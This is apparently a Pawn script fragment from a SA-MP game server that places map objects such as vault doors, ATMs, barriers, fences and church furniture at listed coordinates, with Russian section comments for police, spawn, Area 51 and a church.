CreateDynamicObject(14602,2213.39941406,1763.09863281,1081.59997559,0.00000000,0.00000000,0.00000000); //object(paperchase01) (1)
CreateDynamicObject(14576,2207.03906250,1764.34289551,1071.82141113,0.00000000,0.00000000,179.99450684); //object(vault_door) (1)
CreateDynamicObject(1703,2209.39990234,1776.00000000,1076.19995117,0.00000000,0.00000000,0.00000000); //object(kb_couch02) (1)
CreateDynamicObject(1703,2211.39990234,1771.90002441,1076.19995117,0.00000000,0.00000000,180.00000000); //object(kb_couch02) (2)
CreateDynamicObject(1703,2212.89990234,1774.97998047,1076.19995117,0.00000000,0.00000000,270.00000000); //object(kb_couch02) (3)
CreateDynamicObject(1703,2208.00097656,1772.90002441,1076.19995117,0.00000000,0.00000000,90.00000000); //object(kb_couch02) (4)
CreateDynamicObject(2002,2207.50000000,1778.27001953,1076.22033691,0.00000000,0.00000000,0.00000000); //object(water_coolnu) (1)
CreateDynamicObject(2010,2214.00097656,1769.20043945,1076.20996094,0.00000000,0.00000000,0.00000000); //object(nu_plant3_ofc) (1)
CreateDynamicObject(2010,2214.00000000,1778.50000000,1076.21948242,0.00000000,0.00000000,0.00000000); //object(nu_plant3_ofc) (2)
CreateDynamicObject(2001,2210.89916992,1766.29980469,1076.19995117,0.00000000,0.00000000,0.00000000); //object(nu_plant_ofc) (1)
CreateDynamicObject(2001,2232.80004883,1709.09997559,1018.50000000,0.00000000,0.00000000,0.00000000); //object(nu_plant_ofc) (2)
CreateDynamicObject(2001,2210.82983398,1759.89941406,1076.19995117,0.00000000,0.00000000,0.00000000); //object(nu_plant_ofc) (3)
CreateDynamicObject(2001,2201.42944336,1759.89941406,1076.19995117,0.00000000,0.00000000,0.00000000); //object(nu_plant_ofc) (4)
CreateDynamicObject(2001,2170.60009766,1832.50000000,1015.90002441,0.00000000,0.00000000,0.00000000); //object(nu_plant_ofc) (5)
CreateDynamicObject(2001,2201.50000000,1766.30004883,1076.19995117,0.00000000,0.00000000,0.00000000); //object(nu_plant_ofc) (7)
CreateDynamicObject(2001,2199.99951172,1747.69995117,1076.19995117,0.00000000,0.00000000,0.00000000); //object(nu_plant_ofc) (8)
CreateDynamicObject(2001,2249.60009766,1696.69995117,1023.20001221,0.00000000,0.00000000,0.00000000); //object(nu_plant_ofc) (9)
CreateDynamicObject(2001,2197.30004883,1747.69995117,1076.19995117,0.00000000,0.00000000,0.00000000); //object(nu_plant_ofc) (13)
CreateDynamicObject(1817,2210.00000000,1773.40002441,1076.19995117,0.00000000,0.00000000,0.00000000); //object(coffee_med_2) (1)
CreateDynamicObject(14635,2210.69921875,1769.73962402,1073.09008789,0.00000000,0.00000000,179.99450684); //object(mafcasgenstuff) (1)
CreateDynamicObject(927,2206.00000000,1777.74023438,1072.90002441,0.00000000,0.00000000,0.00000000); //object(piping_detail) (1)
CreateDynamicObject(927,2206.00000000,1762.59997559,1072.90002441,0.00000000,0.00000000,0.00000000); //object(piping_detail) (2)
CreateDynamicObject(1522,2228.00000000,1763.90002441,1076.19995117,0.00000000,0.00000000,270.00000000); //object(gen_doorshop3) (1)
CreateDynamicObject(2186,2190.89990234,1750.09997559,1076.50000000,0.00000000,0.00000000,90.00000000); //object(photocopier_1) (1)
CreateDynamicObject(2186,2192.50000000,1747.90002441,1076.19995117,0.00000000,0.00000000,180.00000000); //object(photocopier_1) (2)
CreateDynamicObject(2164,2190.46777344,1755.30004883,1076.23010254,0.00000000,0.00000000,90.00000000); //object(med_office_unit_5) (1)
CreateDynamicObject(2164,2190.46020508,1757.13000488,1076.23010254,0.00000000,0.00000000,90.00000000); //object(med_office_unit_5) (2)
CreateDynamicObject(2164,2190.46191406,1758.98010254,1076.23010254,0.00000000,0.00000000,88.00000000); //object(med_office_unit_5) (3)
CreateDynamicObject(2163,2190.46777344,1752.79003906,1076.22998047,0.00000000,0.00000000,90.00000000); //object(med_office_unit_2) (2)
CreateDynamicObject(2167,2190.42993164,1765.40002441,1076.19995117,0.00000000,0.00000000,90.00000000); //object(med_office_unit_7) (1)
CreateDynamicObject(2161,2190.42993164,1761.80004883,1076.19995117,0.00000000,0.00000000,90.00000000); //object(med_office_unit_4) (2)
CreateDynamicObject(2163,2190.42993164,1763.40002441,1076.19995117,0.00000000,0.00000000,90.00000000); //object(med_office_unit_2) (3)
CreateDynamicObject(2169,2191.50000000,1778.30993652,1076.19995117,0.00000000,0.00000000,0.00000000); //object(med_office3_desk_1) (1)
CreateDynamicObject(1714,2195.79980469,1763.01000977,1076.19995117,0.00000000,0.00000000,90.00000000); //object(kb_swivelchair1) (2)
CreateDynamicObject(2002,2190.91992188,1775.90002441,1076.19995117,0.00000000,0.00000000,90.00000000); //object(water_coolnu) (2)
CreateDynamicObject(2167,2190.42993164,1774.00000000,1076.19995117,0.00000000,0.00000000,90.00000000); //object(med_office_unit_7) (2)
CreateDynamicObject(2164,2190.43994141,1767.41003418,1076.19995117,0.00000000,0.00000000,90.00000000); //object(med_office_unit_5) (5)
CreateDynamicObject(2161,2190.42993164,1769.50000000,1076.19995117,0.00000000,0.00000000,90.00000000); //object(med_office_unit_4) (3)
CreateDynamicObject(2190,2197.38989258,1761.41992188,1077.00000000,0.00000000,0.00000000,270.00000000); //object(pc_1) (1)
CreateDynamicObject(2190,2197.38989258,1764.30004883,1077.00000000,0.00000000,0.00000000,270.00000000); //object(pc_1) (2)
CreateDynamicObject(2190,2194.39990234,1767.19995117,1077.15087891,0.00000000,0.00000000,270.00000000); //object(pc_1) (3)
CreateDynamicObject(2190,2194.39990234,1758.51989746,1077.15087891,0.00000000,0.00000000,270.00000000); //object(pc_1) (4)
CreateDynamicObject(17566,368.89999390,162.00000000,1020.09997559,0.00000000,0.00000000,0.00000000); //object(wilshire7dr1_law) (1)
CreateDynamicObject(14596,2211.00000000,1747.93994141,1086.93005371,0.00000000,0.00000000,0.00000000); //object(paperchase_stairs) (2)
CreateDynamicObject(17566,2206.91992188,1751.50000000,1083.30004883,0.00000000,0.00000000,0.00000000); //object(sweetsdoor_lae2) (1)
CreateDynamicObject(17566,2206.50000000,1751.50000000,1088.90002441,0.00000000,0.00000000,0.00000000); //object(sweetsdoor_lae2) (2)
CreateDynamicObject(17566,2206.07983398,1752.09997559,1094.90002441,0.00000000,0.00000000,0.00000000); //object(sweetsdoor_lae2) (3)
CreateDynamicObject(1651,2251.50000000,1704.30004883,1078.19995117,0.00000000,0.00000000,0.00000000); //object(od_copwindows) (1)
CreateDynamicObject(14592,2146.70092773,1783.27990723,1077.00048828,0.00000000,0.00000000,359.99450684); //object(mafcasloadbay02) (1)
CreateDynamicObject(14577,2146.55957031,1783.29980469,1076.95996094,0.00000000,0.00000000,359.98901367); //object(mafcasloadbay01) (1)
CreateDynamicObject(3089,2190.94995117,1781.95007324,1071.36999512,0.00000000,0.00000000,270.00000000); //object(ab_casdorlok) (1)
CreateDynamicObject(3089,2126.39990234,1785.50000000,1071.41003418,0.00000000,0.00000000,0.00000000); //object(ab_casdorlok) (3)
CreateDynamicObject(3089,2155.19995117,1765.83007812,1071.36999512,0.00000000,0.00000000,270.00000000); //object(ab_casdorlok) (5)
CreateDynamicObject(923,2178.80004883,1792.40002441,1070.90002441,0.00000000,0.00000000,0.00000000); //object(packing_carates2) (1)
CreateDynamicObject(923,2122.17993164,1806.90002441,1071.00000000,0.00000000,0.00000000,0.00000000); //object(packing_carates2) (2)
CreateDynamicObject(939,2152.40014648,1803.20007324,1072.50000000,0.00000000,0.00000000,0.00000000); //object(cj_df_unit) (1)
CreateDynamicObject(939,2118.80004883,1794.69995117,1072.50000000,0.00000000,0.00000000,270.00000000); //object(cj_df_unit) (2)
CreateDynamicObject(18260,2166.39990234,1791.50000000,1071.59997559,0.00000000,0.00000000,0.00000000); //object(crates01) (1)
CreateDynamicObject(942,2144.89990234,1794.30004883,1072.50000000,0.00000000,0.00000000,0.00000000); //object(cj_df_unit_2) (1)
CreateDynamicObject(2943,2168.89990234,1791.00000000,1070.69995117,0.00000000,0.00000000,190.00000000); //object(kmb_atm2) (1)
CreateDynamicObject(2943,2169.69995117,1791.69995117,1070.80004883,0.00000000,0.00000000,238.00000000); //object(kmb_atm2) (2)
CreateDynamicObject(2943,2168.49902344,1792.50000000,1070.30004883,180.00000000,90.00000000,1.00000000); //object(kmb_atm2) (3)
CreateDynamicObject(2943,2181.10009766,1802.09997559,1070.69995117,0.00000000,0.00000000,300.00000000); //object(kmb_atm2) (4)
CreateDynamicObject(2943,2181.69995117,1800.90002441,1070.69995117,0.00000000,0.00000000,236.00000000); //object(kmb_atm2) (5)
CreateDynamicObject(2943,2180.19995117,1800.80004883,1070.69995117,0.00000000,0.00000000,0.00000000); //object(kmb_atm2) (6)
CreateDynamicObject(2943,2179.60009766,1802.19995117,1070.35998535,0.00000000,90.00000000,248.00000000); //object(kmb_atm2) (8)
CreateDynamicObject(2943,2181.00000000,1799.59997559,1070.69995117,0.00000000,0.00000000,0.00000000); //object(kmb_atm2) (9)
CreateDynamicObject(2943,2179.50000000,1799.40002441,1070.34997559,0.00000000,90.00000000,113.99996948); //object(kmb_atm2) (10)
CreateDynamicObject(2943,2181.69995117,1798.00000000,1070.45996094,0.00000000,90.00000000,222.00000000); //object(kmb_atm2) (11)
CreateDynamicObject(2942,2239.80004883,1849.80004883,1015.79998779,0.00000000,0.00000000,0.00000000); //object(kmb_atm1) (3)
CreateDynamicObject(2943,2180.30004883,1797.90002441,1070.69995117,0.00000000,0.00000000,0.00000000); //object(kmb_atm2) (12)
CreateDynamicObject(2943,2118.60009766,1800.00000000,1070.80004883,0.00000000,0.00000000,0.00000000); //object(kmb_atm2) (13)
CreateDynamicObject(2943,2118.69995117,1801.30004883,1070.80004883,0.00000000,0.00000000,72.00000000); //object(kmb_atm2) (14)
CreateDynamicObject(2943,2118.89990234,1802.59997559,1070.80004883,0.00000000,0.00000000,126.00000000); //object(kmb_atm2) (15)
CreateDynamicObject(2943,2119.89990234,1801.09997559,1070.40002441,0.00000000,90.00000000,88.00000000); //object(kmb_atm2) (16)
CreateDynamicObject(2942,2135.89990234,1794.59997559,1070.69995117,0.00000000,0.00000000,306.00000000); //object(kmb_atm1) (6)
CreateDynamicObject(2942,2135.89990234,1793.30004883,1070.69995117,0.00000000,0.00000000,260.00000000); //object(kmb_atm1) (7)
CreateDynamicObject(2942,2134.89990234,1793.90002441,1070.69995117,0.00000000,0.00000000,262.00000000); //object(kmb_atm1) (8)
CreateDynamicObject(2942,2135.69995117,1792.09997559,1070.69995117,0.00000000,0.00000000,290.00000000); //object(kmb_atm1) (9)
CreateDynamicObject(2942,2134.80004883,1792.69995117,1070.69995117,0.00000000,0.00000000,240.00000000); //object(kmb_atm1) (10)
CreateDynamicObject(2942,2135.60009766,1790.90002441,1070.69995117,0.00000000,0.00000000,268.00000000); //object(kmb_atm1) (11)
CreateDynamicObject(2942,2134.60009766,1791.50000000,1070.69995117,0.00000000,0.00000000,270.00000000); //object(kmb_atm1) (12)
CreateDynamicObject(2942,2135.39990234,1789.80004883,1070.69995117,0.00000000,0.00000000,228.00000000); //object(kmb_atm1) (13)
CreateDynamicObject(2942,2134.10009766,1790.09997559,1070.69995117,0.00000000,0.00000000,292.00000000); //object(kmb_atm1) (14)
CreateDynamicObject(2567,2158.10009766,1805.00000000,1072.00000000,0.00000000,0.00000000,272.00000000); //object(ab_warehouseshelf) (1)
CreateDynamicObject(2567,2141.60009766,1803.20007324,1072.00000000,0.00000000,0.00000000,0.00000000); //object(ab_warehouseshelf) (2)
CreateDynamicObject(2567,2158.10009766,1758.59997559,1072.00000000,0.00000000,0.00000000,270.00000000); //object(ab_warehouseshelf) (3)
CreateDynamicObject(2567,2158.10009766,1771.80004883,1072.00000000,0.00000000,0.00000000,270.00000000); //object(ab_warehouseshelf) (4)
CreateDynamicObject(2567,2180.39990234,1771.80004883,1072.00000000,0.00000000,0.00000000,268.00000000); //object(ab_warehouseshelf) (6)
CreateDynamicObject(2567,2180.10009766,1758.50000000,1072.00000000,0.00000000,0.00000000,268.00000000); //object(ab_warehouseshelf) (7)
CreateDynamicObject(3089,2168.57006836,1619.42224121,1000.29998779,0.00000000,0.00000000,270.00000000); //object(ab_casdorlok) (1)
CreateDynamicObject(3089,2147.06079102,1604.61999512,1006.49987793,0.00000000,0.00000000,0.00000000); //object(ab_casdorlok) (2)
CreateDynamicObject(3089,1247.59997559,-778.44000244,1084.30004883,0.00000000,0.00000000,270.00000000); //object(ab_casdorlok) (3)
CreateDynamicObject(3089,1280.40002441,-787.74591064,1084.30004883,0.00000000,0.00000000,270.00000000); //object(ab_casdorlok) (4)
CreateDynamicObject(3089,1280.39001465,-790.73040771,1084.30004883,0.00000000,0.00000000,90.00000000); //object(ab_casdorlok) (5)
CreateDynamicObject(1536,2577.39990234,-1283.39001465,1053.63000488,0.00000000,0.00000000,270.00000000); //object(gen_doorext15) (1)
CreateDynamicObject(1536,2577.43994141,-1286.40002441,1053.63000488,0.00000000,0.00000000,90.00000000); //object(gen_doorext15) (2)
CreateDynamicObject(1536,2522.32006836,-1303.41894531,1047.27001953,0.00000000,0.00000000,90.00000000); //object(gen_doorext15) (4)
CreateDynamicObject(1536,2522.28002930,-1300.41894531,1047.27001953,0.00000000,0.00000000,270.00000000); //object(gen_doorext15) (5)
CreateDynamicObject(1497,2543.81005859,-1303.36999512,1053.63000488,0.00000000,0.00000000,270.00000000); //object(gen_doorext02) (1)
CreateDynamicObject(1497,2543.84008789,-1306.38000488,1053.63000488,0.00000000,0.00000000,90.00000000); //object(gen_doorext02) (2)
CreateDynamicObject(3089,1260.40002441,-802.79022217,1084.30004883,0.00000000,0.00000000,270.00000000); //object(ab_casdorlok) (2)
CreateDynamicObject(3089,1260.39501953,-805.77703857,1084.30004883,0.00000000,0.00000000,90.00000000); //object(ab_casdorlok) (4)
Object[0] = CreateObject(968,-2057.18994141,-101.19999695,34.90000153,0.00000000,-90.00000000,270.00000000); //object(barrierturn) (1)
//==============================================================================
CreateDynamicObject(1497,2577.80004883,-1288.40002441,1043.10998535,0.00000000,0.00000000,270.00000000); //object(gen_doorext02) (1)
CreateDynamicObject(1497,2577.83007812,-1291.40002441,1043.10998535,0.00000000,0.00000000,90.00000000); //object(gen_doorext02) (2)
// Полиция
Object[1] = CreateObject(968,-1701.43395996,687.69000244,24.65999794,0.00000000,90.00000000,270.00000000); //object(barrierturn) (2)
Object[2] = CreateObject(968,-1572.18994141,658.70001221,6.89099789,0.00000000,90.00000000,90.00000000); //object(barrierturn) (3)
CreateDynamicObject(982,-1687.19995117,689.40002441,24.39999962,0.00000000,0.00000000,270.00000000); //object(fenceshit) (2)
CreateDynamicObject(982,-1661.59997559,689.39996338,24.40999985,0.00000000,0.00000000,270.00000000); //object(fenceshit) (3)
Object[3] = CreateObject(968,1544.69006348,-1630.90002441,13.13999939,0.00000000,90.00000000,90.00000000); //object(barrierturn) (4)
CreateDynamicObject(1237,1544.19995117,-1634.30004883,12.60000038,0.00000000,0.00000000,0.00000000); //object(strtbarrier01) (1)
CreateDynamicObject(997,1544.69995117,-1619.09997559,12.50000000,0.00000000,0.00000000,270.00000000); //object(lhouse_barrier3) (1)
Object[4] = CreateObject(968,2238.19995117,2450.29980469,10.65000057,0.00000000,90.00000000,90.00000000); //object(barrierturn) (5)
//Спавн
CreateObject(1280,1112.0000000,-1790.0000000,16.0000000,0.0000000,0.0000000,0.0000000); //object(parkbench1) (1)
CreateObject(1280,1112.0000000,-1787.5000000,16.0000000,0.0000000,0.0000000,0.0000000); //object(parkbench1) (2)
CreateObject(1280,1112.0000000,-1803.8000500,16.0000000,0.0000000,0.0000000,0.0000000); //object(parkbench1) (3)
CreateObject(1280,1112.0000000,-1806.3000500,16.0000000,0.0000000,0.0000000,0.0000000); //object(parkbench1) (4)
CreateObject(639,1112.3000500,-1793.3000500,20.5000000,0.0000000,0.0000000,0.0000000); //object(veg_ivy_balcny_kb3) (1)
CreateObject(639,1112.3000500,-1799.1999500,20.5000000,0.0000000,0.0000000,0.0000000); //object(veg_ivy_balcny_kb3) (2)
CreateObject(639,1112.3000500,-1805.0000000,20.5000000,0.0000000,0.0000000,0.0000000); //object(veg_ivy_balcny_kb3) (3)
CreateObject(639,1112.3000500,-1788.8000500,20.5000000,0.0000000,0.0000000,0.0000000); //object(veg_ivy_balcny_kb3) (4)
CreateObject(638,1106.9000200,-1790.3000500,16.3000000,0.0000000,0.0000000,0.0000000); //object(kb_planter_bush) (1)
CreateObject(638,1107.0000000,-1802.8000500,16.3000000,0.0000000,0.0000000,0.0000000); //object(kb_planter_bush) (2)
CreateObject(638,1106.9000200,-1796.5000000,16.3000000,0.0000000,0.0000000,0.0000000); //object(kb_planter_bush) (3)
CreateObject(870,1102.1999500,-1787.0000000,12.8000000,0.0000000,0.0000000,0.0000000); //object(veg_pflowers2wee) (1)
CreateObject(1408,1100.8000500,-1785.5999800,13.2000000,0.0000000,0.0000000,270.0000000); //object(dyn_f_wood_2) (1)
CreateObject(1408,1103.5000000,-1782.9000200,13.2000000,0.0000000,0.0000000,180.0000000); //object(dyn_f_wood_2) (2)
CreateObject(870,1102.3000500,-1784.8000500,12.9000000,0.0000000,0.0000000,0.0000000); //object(veg_pflowers2wee) (2)
CreateObject(870,1104.4000200,-1784.4000200,12.8000000,0.0000000,0.0000000,0.0000000); //object(veg_pflowers2wee) (3)
CreateObject(870,1104.5999800,-1786.6999500,12.8000000,0.0000000,0.0000000,0.0000000); //object(veg_pflowers2wee) (4)
CreateObject(870,1103.5999800,-1785.5999800,12.8000000,0.0000000,0.0000000,0.0000000); //object(veg_pflowers2wee) (5)
CreateObject(869,1104.0000000,-1784.6999500,13.1000000,0.0000000,0.0000000,0.0000000); //object(veg_pflowerswee) (13)
CreateObject(871,1102.6999500,-1786.1999500,12.9000000,0.0000000,0.0000000,0.0000000); //object(veg_procfpatchwee) (1)
CreateObject(1215,0.0000000,0.0000000,0.0000000,0.0000000,0.0000000,0.0000000); //object(bollardlight) (1)
CreateObject(1215,1100.0999800,-1791.9000200,13.2000000,0.0000000,0.0000000,0.0000000); //object(bollardlight) (2)
CreateObject(1215,1100.0999800,-1795.0000000,13.2000000,0.0000000,0.0000000,0.0000000); //object(bollardlight) (3)
CreateObject(1215,1100.1999500,-1798.0999800,13.2000000,0.0000000,0.0000000,0.0000000); //object(bollardlight) (4)
CreateObject(1215,1100.0999800,-1803.9000200,13.2000000,0.0000000,0.0000000,0.0000000); //object(bollardlight) (6)
CreateObject(1215,1106.4000200,-1788.6999500,16.7000000,0.0000000,0.0000000,0.0000000); //object(bollardlight) (7)
CreateObject(1215,1106.4000200,-1782.0000000,16.7000000,0.0000000,0.0000000,0.0000000); //object(bollardlight) (8)
CreateObject(1215,1106.4000200,-1804.1999500,16.8000000,0.0000000,0.0000000,0.0000000); //object(bollardlight) (10)
CreateObject(1215,1112.4000200,-1786.0999800,22.5000000,88.0000000,180.0000000,91.7500000); //object(bollardlight) (11)
CreateObject(1215,1112.3000500,-1789.6999500,22.4000000,87.9950000,179.9950000,91.7470000); //object(bollardlight) (12)
CreateObject(1215,1112.3000500,-1793.5000000,22.4000000,87.9950000,179.9950000,91.7470000); //object(bollardlight) (13)
CreateObject(1215,1112.3000500,-1797.1999500,22.4000000,87.9950000,179.9950000,91.7470000); //object(bollardlight) (14)
CreateObject(1215,1112.3000500,-1800.9000200,22.4000000,87.9950000,179.9950000,91.7470000); //object(bollardlight) (15)
CreateObject(1215,1112.3000500,-1804.6999500,22.4000000,87.9950000,179.9950000,91.7470000); //object(bollardlight) (16)
CreateObject(1215,1112.3000500,-1807.9000200,22.5000000,87.9950000,179.9950000,91.7470000); //object(bollardlight) (17)
CreateObject(970,1104.1999500,-1782.0000000,13.2000000,0.0000000,0.0000000,0.0000000); //object(fencesmallb) (1)
CreateObject(970,1100.0999800,-1782.0000000,13.2000000,0.0000000,0.0000000,0.0000000); //object(fencesmallb) (2)
CreateObject(970,1096.0000000,-1782.0000000,13.2000000,0.0000000,0.0000000,0.0000000); //object(fencesmallb) (3)
CreateObject(970,1091.9000200,-1782.0000000,13.2000000,0.0000000,0.0000000,0.0000000); //object(fencesmallb) (4)
CreateObject(970,1087.8000500,-1782.0000000,13.2000000,0.0000000,0.0000000,0.0000000); //object(fencesmallb) (5)
CreateObject(970,1083.6999500,-1782.0000000,13.2000000,0.0000000,0.0000000,0.0000000); //object(fencesmallb) (6)
CreateObject(970,1079.5999800,-1782.0000000,13.2000000,0.0000000,0.0000000,0.0000000); //object(fencesmallb) (7)
CreateObject(970,1077.5000000,-1784.0999800,13.2000000,0.0000000,0.0000000,270.0000000); //object(fencesmallb) (8)
CreateObject(970,1077.5000000,-1791.1999500,13.2000000,0.0000000,0.0000000,270.0000000); //object(fencesmallb) (9)
CreateObject(970,1077.5000000,-1795.3000500,13.2000000,0.0000000,0.0000000,270.0000000); //object(fencesmallb) (10)
CreateObject(970,1077.5000000,-1799.4000200,13.2000000,0.0000000,0.0000000,270.0000000); //object(fencesmallb) (11)
CreateObject(970,1077.5000000,-1803.5000000,13.2000000,0.0000000,0.0000000,270.0000000); //object(fencesmallb) (12)
CreateObject(970,1082.1999500,-1805.4000200,13.2000000,0.0000000,0.0000000,180.0000000); //object(fencesmallb) (13)
// Зона 51
CreateObject(987, 200.99, 1957.81, 16.63, 0.00, 0.00, 178.51);
CreateObject(987, 121.76, 1791.65, 16.63, 0.00, 0.00, 2.42);
CreateObject(987, 285.37, 1826.87, 16.63, 0.00, 0.00, 92.31);
CreateObject(987, 284.99, 1838.83, 16.63, 0.00, 0.00, 92.31);
CreateObject(987, 284.51, 1850.67, 16.63, 0.00, 0.00, 92.31);
CreateObject(987, 284.07, 1862.63, 16.63, 0.00, 0.00, 92.31);
CreateObject(987, 283.58, 1874.62, 16.63, 0.00, 0.00, 92.31);
CreateObject(987, 283.08, 1886.49, 16.63, 0.00, 0.00, 92.31);
CreateObject(987, 282.63, 1898.39, 16.63, 0.00, 0.00, 92.31);
CreateObject(987, 282.30, 1910.29, 16.63, 0.00, 0.00, 137.13);
CreateObject(987, 273.57, 1918.45, 16.63, 0.00, 0.00, 137.13);
CreateObject(987, 264.88, 1926.65, 16.63, 0.00, 0.00, 137.13);
CreateObject(987, 256.14, 1934.79, 16.63, 0.00, 0.00, 137.13);
CreateObject(987, 247.44, 1942.96, 16.63, 0.00, 0.00, 137.13);
CreateObject(987, 240.82, 1949.11, 16.63, 0.00, 0.00, 137.13);
CreateObject(987, 232.04, 1957.14, 16.63, 0.00, 0.00, 178.51);
CreateObject(987, 220.02, 1957.43, 16.63, 0.00, 0.00, 178.51);
CreateObject(987, 208.23, 1957.68, 16.63, 0.00, 0.00, 178.51);
CreateObject(987, 285.95, 1804.10, 16.63, 0.00, 0.00, 92.31);
CreateObject(987, 276.10, 1797.68, 16.63, 0.00, 0.00, 33.27);
CreateObject(987, 264.29, 1797.20, 16.63, 0.00, 0.00, 2.42);
CreateObject(987, 252.39, 1796.68, 16.63, 0.00, 0.00, 2.42);
CreateObject(987, 240.45, 1796.15, 16.63, 0.00, 0.00, 2.42);
CreateObject(987, 228.55, 1795.74, 16.63, 0.00, 0.00, 2.42);
CreateObject(987, 216.62, 1795.32, 16.63, 0.00, 0.00, 2.42);
CreateObject(987, 204.71, 1794.80, 16.63, 0.00, 0.00, 2.42);
CreateObject(987, 192.86, 1794.26, 16.63, 0.00, 0.00, 2.42);
CreateObject(987, 181.02, 1793.75, 16.63, 0.00, 0.00, 2.42);
CreateObject(987, 169.13, 1793.31, 16.63, 0.00, 0.00, 2.42);
CreateObject(987, 157.25, 1792.99, 16.63, 0.00, 0.00, 2.42);
CreateObject(987, 145.53, 1792.48, 16.63, 0.00, 0.00, 2.42);
CreateObject(987, 133.60, 1792.06, 16.63, 0.00, 0.00, 2.42);
CreateObject(987, 109.81, 1791.09, 16.63, 0.00, 0.00, 2.42);
CreateObject(987, 89.01, 1790.29, 16.63, 0.00, 0.00, 2.42);
CreateObject(987, 97.98, 1790.66, 16.63, 0.00, 0.00, 2.42);
CreateObject(987, 88.76, 1802.13, 16.63, 0.00, 0.00, 271.38);
CreateObject(987, 88.44, 1814.03, 16.63, 0.00, 0.00, 271.38);
CreateObject(987, 88.17, 1825.96, 16.63, 0.00, 0.00, 271.38);
CreateObject(987, 87.88, 1837.91, 16.63, 0.00, 0.00, 271.38);
CreateObject(987, 87.67, 1849.74, 16.63, 0.00, 0.00, 271.38);
CreateObject(987, 87.40, 1861.44, 16.63, 0.00, 0.00, 271.38);
CreateObject(987, 87.21, 1873.25, 16.63, 0.00, 0.00, 271.38);
CreateObject(987, 86.96, 1885.06, 16.63, 0.00, 0.00, 271.38);
CreateObject(987, 86.69, 1897.07, 16.63, 0.00, 0.00, 271.38);
CreateObject(987, 86.29, 1909.10, 16.63, 0.00, 0.00, 271.38);
CreateObject(987, 85.99, 1921.11, 16.63, 0.00, 0.00, 271.38);
CreateObject(987, 85.64, 1933.12, 16.63, 0.00, 0.00, 271.38);
CreateObject(987, 85.47, 1939.13, 16.63, 0.00, 0.00, 271.38);
CreateObject(987, 189.01, 1940.87, 16.53, 0.00, 0.00, 180.53);
CreateObject(987, 97.16, 1939.19, 16.63, 0.00, 0.00, 181.78);
CreateObject(987, 109.07, 1939.53, 16.63, 0.00, 0.00, 181.78);
CreateObject(987, 118.13, 1939.88, 16.63, 0.00, 0.00, 181.78);
CreateObject(987, 124.11, 1940.15, 16.63, 0.00, 0.00, 181.78);
CreateObject(987, 153.09, 1940.43, 16.63, 0.00, 0.00, 180.53);
CreateObject(987, 165.09, 1940.53, 16.53, 0.00, 0.00, 180.53);
CreateObject(987, 177.05, 1940.73, 16.53, 0.00, 0.00, 180.53);
vorota = CreateObject(985,285.6441, 1817.2820, 18.3479,0.0000, 0.0000, 270.0000); //object(gate_autor) (1)
vorota2 = CreateObject(986,285.6448, 1825.2371, 18.3538,0.0000, 0.0000, 270.1800); //object(gate_autol) (1)
vorota3 = CreateObject(16773,-1946.0976, -1015.3544, 35.0999,0.0000, 0.0000, 0.0000); // Закрыто ФБР
CreateObject(3755, 342.4174, 1951.0457, 21.8063,   0.0000, 0.0000, -91.2200);
CreateDynamicObject(3279,384.702789, 1892.396484, 16.716242,-1.570796, 0.000000, 180.000000);
CreateDynamicObject(3279,350.380798, 1807.448975, 17.561840,1.748893, 0.000000, 180.000000);
CreateDynamicObject(3279, 333.368652, 1795.830444, 17.059250,0.552544, 0.000000, 180.000000);
CreateObject(987, 140.8853, 1940.3438, 16.6300, 0.0000, 0.0000, 180.3100);
CreateObject(987, 135.9784, 1940.2891, 16.6300, 00.0000, 0.0000, 180.5300);
CreateObject(16096, 148.5, 1937.6999, 20.1110, 0, 0, 0); // Объект 0
CreateObject(16095, 148.9082, 1945, 18.2479, 0, 0, 0); // Объект 1
CreateObject(3707,353.669983, 1950.344604, 24.623753,0.141593, 0.000000, 180.000000);//Склад
// Церковь
CreateDynamicObject(5710,-2035.896,1092.055,21.414,0.0,0.0,0.0);
CreateDynamicObject(5710,-2021.334,1074.279,21.330,0.0,0.0,-89.381);
CreateDynamicObject(5710,-2023.422,1074.527,24.567,180.482,0.0,-87.663);
CreateDynamicObject(5710,-2010.786,1092.276,21.418,0.0,0.0,180.482);
CreateDynamicObject(10676,-2024.834,1101.626,9.607,0.0,0.0,0.0);
CreateDynamicObject(5710,-2003.884,1124.533,22.372,0.0,0.0,2.578);
CreateDynamicObject(5710,-2044.215,1124.109,22.372,0.0,0.0,179.622);
CreateDynamicObject(5710,-2024.951,1145.353,20.497,0.0,0.0,273.301);
CreateDynamicObject(10676,-2025.565,1132.252,31.499,180.482,0.0,1.719);
CreateDynamicObject(17950,-2025.184,1147.850,19.802,-6.016,0.0,-177.044);
CreateDynamicObject(10676,-2081.264,1094.225,18.983,0.0,0.0,89.381);
CreateDynamicObject(10676,-1965.052,1091.448,18.998,0.0,0.0,-88.522);
CreateDynamicObject(616,-2055.353,1090.207,-2.164,0.0,0.0,-7.735);
CreateDynamicObject(616,-1992.356,1092.405,-2.399,0.0,0.0,2.578);
CreateDynamicObject(617,-2039.203,1124.151,12.521,0.0,0.0,0.0);
CreateDynamicObject(617,-2009.599,1123.927,13.046,0.0,0.0,0.0);
CreateDynamicObject(3406,-2024.756,1139.860,14.998,0.0,0.0,91.960);
CreateDynamicObject(14535,-2002.932,1089.430,19.881,0.0,0.0,0.0);
CreateDynamicObject(2591,-2005.792,1087.077,18.070,0.0,0.0,0.0);
CreateDynamicObject(2591,-2007.452,1088.775,18.059,0.0,0.0,-91.100);
CreateDynamicObject(2591,-2010.355,1090.212,18.159,0.0,0.0,-274.160);
CreateDynamicObject(2639,-2026.608,1129.086,17.680,0.0,0.0,181.341);
CreateDynamicObject(2639,-2028.664,1129.044,17.680,0.0,0.0,181.341);
CreateDynamicObject(2639,-2032.265,1129.003,17.680,0.0,0.0,181.341);
CreateDynamicObject(2639,-2026.460,1125.217,17.680,0.0,0.0,181.341);
CreateDynamicObject(2639,-2028.505,1125.171,17.680,0.0,0.0,181.341);
CreateDynamicObject(2639,-2032.316,1125.076,17.680,0.0,0.0,181.341);
CreateDynamicObject(2639,-2026.407,1121.527,17.680,0.0,0.0,181.341);
CreateDynamicObject(2639,-2028.439,1121.477,17.680,0.0,0.0,181.341);
CreateDynamicObject(2639,-2032.265,1121.446,17.680,0.0,0.0,181.341);
CreateDynamicObject(2639,-2026.299,1117.462,17.680,0.0,0.0,181.341);
CreateDynamicObject(2639,-2028.308,1117.420,17.680,0.0,0.0,181.341);
CreateDynamicObject(2639,-2032.234,1117.276,17.680,0.0,0.0,181.341);
CreateDynamicObject(2639,-2026.137,1114.010,17.680,0.0,0.0,181.341);
CreateDynamicObject(2639,-2028.174,1113.973,17.680,0.0,0.0,181.341);
